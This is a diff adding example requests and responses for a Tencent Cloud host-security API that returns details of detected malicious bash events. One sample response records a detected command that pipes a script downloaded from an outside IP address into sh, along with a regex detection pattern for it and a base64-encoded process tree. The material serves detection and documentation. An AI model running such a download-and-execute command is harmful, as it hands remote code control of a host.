@@ -830,6 +830,20 @@
         "title": "获取高危命令列表"
       }
     ],
+    "DescribeBashEventsInfoNew": [
+      {
+        "document": "",
+        "input": "POST / HTTP/1.1\nHost: cwp.tencentcloudapi.com\nContent-Type: application/json\nX-TC-Action: DescribeBashEventsInfoNew\n<公共请求参数>\n\n{\n    \"Id\": 12\n}",
+        "output": "{\n    \"Response\": {\n        \"BashEventsInfo\": {\n            \"Uuid\": \"xx\",\n            \"RegexBashCmd\": \"xx\",\n            \"Platform\": 1,\n            \"Id\": 1,\n            \"Status\": 1,\n            \"MachineWanIp\": \"xx\",\n            \"Tags\": [\n                \"xx\"\n            ],\n            \"MachineName\": \"xx\",\n            \"RuleLevel\": 1,\n            \"SuggestScheme\": \"xx\",\n            \"Exe\": \"xx\",\n            \"HostIp\": \"xx\",\n            \"ModifyTime\": \"xx\",\n            \"BashCmd\": \"xx\",\n            \"RuleCategory\": 1,\n            \"RuleId\": 1,\n            \"HarmDescribe\": \"xx\",\n            \"References\": [\n                \"xx\"\n            ],\n            \"Quuid\": \"xx\",\n            \"RuleName\": \"xx\",\n            \"MachineStatus\": \"xx\",\n            \"CreateTime\": \"xx\",\n            \"PsTree\": \"xx\"\n        },\n        \"RequestId\": \"f14ce73f-50d7-4c36-af1d-fc33dae510c4\"\n    }\n}",
+        "title": "示例"
+      },
+      {
+        "document": "",
+        "input": "POST / HTTP/1.1\nHost: cwp.tencentcloudapi.com\nContent-Type: application/json\nX-TC-Action: DescribeBashEventsInfoNew\n<公共请求参数>\n\n{\n    \"Id\": \"3170751\"\n}",
+        "output": "{\n    \"Response\": {\n        \"BashEventsInfo\": {\n            \"Uuid\": \"7168bc08-c1b8-11ea-9053-48fd8e5f474c\",\n            \"Id\": 3170751,\n            \"Quuid\": \"d8feb20e-dcdd-461b-9b37-336c42d48657\",\n            \"HostIp\": \"172.16.0.49\",\n            \"Platform\": 4,\n            \"BashCmd\": \"/bin/sh -c curl 43.129.65.101/1.sh|sh\",\n            \"RuleId\": 0,\n            \"RuleName\": \"1003.恶意命令-下载&执行未知程序\",\n            \"RuleLevel\": 1,\n            \"Status\": 0,\n            \"CreateTime\": \"2022-09-19 19:45:05\",\n            \"Exe\": \"/usr/bin/bash\",\n            \"ModifyTime\": \"2022-09-19 19:45:05\",\n            \"PsTree\": \"W3sicGlkIjoyOTQ0NiwiZXhlIjoiL3Vzci9iaW4vYmFzaCIsImFjY291bnQiOiJyb290OnJvb3QiLCJjbWRsaW5lIjoiL2Jpbi9zaCAtYyBjdXJsIDQzLjEyOS42NS4xMDEvMS5zaHxzaCJ9LHsicGlkIjoyOTQ0NCwiZXhlIjoiL3Vzci9zYmluL2Nyb25kIiwiYWNjb3VudCI6InJvb3Q6cm9vdCIsImNtZGxpbmUiOiIvdXNyL3NiaW4vQ1JPTkQgLW4ifSx7InBpZCI6MTM5OSwiZXhlIjoiL3Vzci9zYmluL2Nyb25kIiwiYWNjb3VudCI6InJvb3Q6cm9vdCIsImNtZGxpbmUiOiIvdXNyL3NiaW4vY3JvbmQgLW4ifV0=\",\n            \"User\": \"0:0\",\n            \"Pid\": \"29446\",\n            \"RegexBashCmd\": \"/bin/sh -c curl 43\\\\.129\\\\.65\\\\.101/1\\\\.sh\\\\|sh\",\n            \"RuleCategory\": 0,\n            \"MachineName\": \"功能测试软件较多_ivon\",\n            \"SuggestScheme\": \"1.检查恶意进程及非法端口，删除可疑的启动项和定时任务；\\n2.隔离或者删除相关的木马文件；\\n3.对系统进行风险排查，并进行安全加固，详情可参考如下链接： \\n【Linux】https://cloud.tencent.com/document/product/296/9604 \\n【Windows】https://cloud.tencent.com/document/product/296/9605\",\n            \"HarmDescribe\": \"黑客在入侵服务器后，为了进行下一步的恶意操作，会执行恶意文件下载、连接矿池、添加公钥、查看敏感文件等操作。\",\n            \"Tags\": [],\n            \"References\": [],\n            \"MachineWanIp\": \"42.194.146.17\",\n            \"MachineStatus\": \"ONLINE\",\n            \"MachineType\": 2,\n            \"DetectBy\": 1\n        },\n        \"RequestId\": \"0a9b5442-cd56-4b47-86c7-0f9f22d9fc7e\"\n    }\n}",
+        "title": "示例1"
+      }
+    ],
     "DescribeBashEventsNew": [
       {
         "document": "",
